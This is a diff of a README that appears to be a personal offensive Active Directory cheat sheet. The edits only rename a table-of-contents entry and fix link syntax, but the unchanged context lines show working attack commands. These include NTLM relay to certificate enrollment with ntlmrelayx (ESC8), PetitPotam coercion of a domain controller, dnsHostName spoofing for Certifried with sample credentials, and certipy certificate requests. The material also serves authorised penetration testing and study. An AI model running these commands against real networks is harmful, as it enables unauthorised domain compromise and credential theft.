@@ -74,7 +74,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 * **[Active Directory Certificate Service](#ADCS)**
 	* [PKI Abuse](#pki-abuse)
 	* [ESC8](#esc8)
-	* [Machine Account dnsHostName confusion](#machine-account-dnshostname-confusion)
+	* [Certifried](#certifried)
 * **[Relay Notes](#relay-notes)**
 * **[File Transfer](#file-transfer)**
 * **[Reverse Shells](#reverse-shells)**
@@ -814,7 +814,7 @@ This requires NTLMv2 relaying from target identity to the /certsrc/certfnsh.asp 
 ```
 ntlmrelayx.py -t http://192.168.86.183/certsrv/certfnsh.asp -smb2support --adcs --template 'KerberosAuthentication'
 ```
-2. Coerce authentication using ![PetitPotam](https://github.com/topotam/PetitPotam). _Note that patched system doesnt allow unauthenticated coerce, then it would require a credential_
+2. Coerce authentication using [PetitPotam](https://github.com/topotam/PetitPotam). _Note that patched system doesnt allow unauthenticated coerce, then it would require a credential_
 ```
 # unpatched DC
 python3 PetitPotam.py 192.168.86.165 192.168.86.182
@@ -856,12 +856,12 @@ addspn.py --clear -t 'FakeComputer$' -u 'domain\user' -p 'password' 'DC.domain.l
 Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com
 ```
 
-_Note that above steps 1-3 could be automated with my messy script ![certifried.py](https://github.com/aniqfakhrul/certifried.py)_
+_Note that above steps 1-3 could be automated with my messy script [certifried.py](https://github.com/aniqfakhrul/certifried.py)_
 ```
 python3 certifried.py range.net/peter:'Welcome1234' -dc-ip 192.168.86.182
 ```
 
-4. Request certificate with ![Certipy](https://github.com/ly4k/Certipy)
+4. Request certificate with [Certipy](https://github.com/ly4k/Certipy)
 ```
 certipy req domain.local/FakeComputer\$:Password123@dc.domain.local -ca DOMAIN-DC-CA -template Machine
 ```
